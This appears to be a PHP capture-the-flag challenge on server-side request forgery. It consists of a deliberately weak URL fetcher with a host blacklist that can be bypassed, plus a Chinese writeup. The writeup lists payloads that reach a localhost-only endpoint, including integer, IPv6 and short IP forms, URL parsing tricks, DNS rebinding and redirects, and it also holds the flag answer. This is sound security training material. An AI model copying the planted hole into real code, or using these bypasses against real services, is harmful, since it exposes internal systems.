<?php
/*
 * 题目7: SSRF与内网探测
 * 考察点: SSRF漏洞、协议绕过、内网服务探测、Gopher协议
 * 难度: 中等
 * Flag: flag{ssrf_1nt3rn4l_s3rv1c3}
 */

error_reporting(0);

// 模拟内网服务
if (isset($_GET['internal']) && $_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
    // 只有本地访问才能获取flag
    echo "Welcome internal user! Flag: flag{ssrf_1nt3rn4l_s3rv1c3}";
    exit;
}

highlight_file(__FILE__);

function fetch_url($url) {
    // URL过滤
    $parsed = parse_url($url);
    
    // 协议白名单
    $allowed_schemes = ['http', 'https'];
    if (!isset($parsed['scheme']) || !in_array(strtolower($parsed['scheme']), $allowed_schemes)) {
        return "Error: Only HTTP/HTTPS protocols allowed!";
    }
    
    // 黑名单过滤
    $blacklist = [
        '127.0.0.1',
        'localhost',
        '0.0.0.0',
        '::1',
        'internal',
        'admin'
    ];
    
    $host = strtolower($parsed['host'] ?? '');
    foreach ($blacklist as $blocked) {
        if (strpos($host, $blocked) !== false) {
            return "Error: Blocked host!";
        }
    }
    
    // 检查是否为内网IP
    $ip = gethostbyname($host);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return "Error: Private/Reserved IP not allowed!";
    }
    
    // 发起请求
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'SSRF-Bot/1.0');
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        return "Error: " . htmlspecialchars($error);
    }
    
    return $response;
}

echo "<h1>URL Fetcher Service</h1>";
echo "<p>Fetch any URL content (for legitimate purposes only!)</p>";

if (isset($_GET['url'])) {
    $url = $_GET['url'];
    echo "<h2>Fetching: " . htmlspecialchars($url) . "</h2>";
    echo "<pre>" . htmlspecialchars(fetch_url($url)) . "</pre>";
} else {
    echo '<form method="GET">
        <label>URL: <input type="text" name="url" size="50" placeholder="https://example.com"></label>
        <input type="submit" value="Fetch">
    </form>';
    echo "<p>Hint: There's an internal service at /?internal=1 that only localhost can access...</p>";
}
?>
<?php
/*
Writeup:
考察点：
1. SSRF基础利用
2. IP地址绕过技巧
3. DNS重绑定
4. URL解析差异

绕过方法：

1. 特殊IP表示法：
   - 0x7f.0.0.1 (十六进制)
   - 017700000001 (八进制)
   - 2130706433 (十进制整数)
   - 127.1 (简写)
   - 127.0.0.1.xip.io (DNS解析)

2. IPv6绕过：
   - http://[::ffff:127.0.0.1]/
   - http://[0:0:0:0:0:ffff:127.0.0.1]/

3. URL解析差异：
   - http://evil.com@127.0.0.1/
   - http://127.0.0.1#@evil.com/
   - http://127。0。0。1/ (全角字符)

4. DNS重绑定：
   - 设置域名第一次解析为合法IP，第二次解析为127.0.0.1
   - 使用7f000001.rbndr.us等服务

5. 302跳转：
   - 在自己服务器上设置302跳转到127.0.0.1

实际Payload：
方案1 - IP整数表示：
?url=http://2130706433/?internal=1

方案2 - 短地址绕过：
?url=http://127.1/?internal=1

方案3 - IPv6格式：
?url=http://[::ffff:127.0.0.1]/?internal=1

方案4 - 0.0.0.0（某些系统等价于localhost）：
先测试是否被拦截

方案5 - 使用外部重定向服务：
设置外部网站返回302跳转到 http://127.0.0.1/?internal=1
*/
?>
